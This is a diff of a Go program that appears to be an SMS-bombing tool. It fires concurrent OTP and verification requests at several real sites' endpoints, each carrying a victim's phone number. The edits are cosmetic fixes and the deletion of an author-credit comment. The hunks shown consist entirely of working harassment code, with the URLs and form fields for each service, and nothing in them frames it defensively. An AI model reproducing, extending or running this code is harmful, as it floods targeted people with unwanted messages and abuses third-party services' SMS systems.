@@ -425,7 +425,7 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": phone, .
+					"mobile": phone, 
 				}
 				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
 			}
@@ -544,8 +544,8 @@ cookieJar, _ := cookiejar.New(nil)
 
 		// telketab.com (POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { /
-			return func() {
+		tasks <- func(c *http.Client) func() { 
+			return func() { 
 				formData := url.Values{}
 				formData.Set("identity", phone)
 				formData.Set("secret", "")
@@ -554,6 +554,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://telketab.com/opt_field/check_secret", formData, &wg, ch) // ارسال c
 			}
 		}(client) 
+
 		// techsiro.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -563,7 +564,7 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("method", "POST")
 				formData.Set("_token", "")
 				formData.Set("mobile", phone)
-				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) // ارسال c
+				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) 
 			}
 		}(client) 
 
@@ -1750,7 +1751,7 @@ cookieJar, _ := cookiejar.New(nil)
 			ch <- resp.StatusCode
 		}
 	}
-//Code by @monsmain
+
 	close(tasks)
 
 	go func() {
